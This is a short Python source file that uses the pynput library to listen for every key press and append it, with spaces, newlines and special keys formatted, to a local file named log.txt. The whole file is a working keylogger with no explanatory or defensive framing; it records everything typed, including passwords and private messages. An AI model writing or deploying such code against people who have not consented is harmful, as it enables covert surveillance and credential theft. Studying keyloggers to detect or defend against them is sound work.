from pynput.keyboard import Listener

log_file = "log.txt"

def write_to_file(key):
    key = str(key).replace("'", "")

    if key == 'Key.space':
        key = ' '
    elif key == 'Key.enter':
        key = '\n'
    elif 'Key' in key:
        key = f' [{key}] '

    with open(log_file, "a") as file:
        file.write(key)

with Listener(on_press=write_to_file) as listener:
    listener.join()